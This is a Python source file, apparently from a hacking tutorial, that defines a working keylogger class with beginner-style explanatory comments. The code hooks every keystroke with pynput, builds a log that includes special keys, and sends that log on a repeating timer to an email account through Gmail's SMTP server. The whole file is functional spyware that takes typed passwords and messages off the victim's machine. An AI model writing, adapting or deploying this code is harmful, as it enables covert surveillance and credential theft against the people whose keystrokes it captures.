#!/usr/bin/env python
# records all keystrokes and sends them in an email

import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval, email,
                 password):  # creates constructor method which contains code that will be auto executed
        self.log = "Keylogger Started"  # creates  attribute we can use in the entire class
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):  # creates function to append all of the inputs to the log
        self.log = self.log + string

    def process_key_press(self, key):  # callback function (executed everytime user presses a key), method will be callled on instance of object so requires self as an argument
        try:  # this gets rid of the error of special keys not having a char value assigned
            current_key = str(key.char)  # appends each key to the log (converts key from byte to str)(char gets rid of all the unnecessary characters printed and only prints keys)
        except AttributeError:
            if key == key.space:
                current_key = " "  # adds space where every space should be
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = " " + str(key) + " "  # logs special key
        self.append_to_log(current_key)

    def report(self):  # recursive function (calls itself)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""  # refresh
        timer = threading.Timer(self.interval, self.report)  # after timer starts, wait x seconds and then call function
        timer.start()  # starts timer

    def send_mail(self, email, password, message):  # takes email passwrod and message as inputs
        server = smtplib.SMTP("smtp.gmail.com", 587)  # creates server variable that is an instance of an smtp server using the smtplibrabry
        # specifyin the server we want to use (google) and the port (googles is 587)
        server.starttls()  # initating tls connectioon
        server.login(email, password)  # login
        server.sendmail(email, email, message)  # send an email to ourselves with the message
        server.quit()  # quit the server

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)  # creating instance of listener object from library we inputted
        # everytime a key is pressed it calls a function called "process_key_pressed" which prints the key pressed
        with keyboard_listener:
            self.report()
            keyboard_listener.join()  # starts the function
            # anywhere a method is called in the class, must add "self" before bc of required arguments
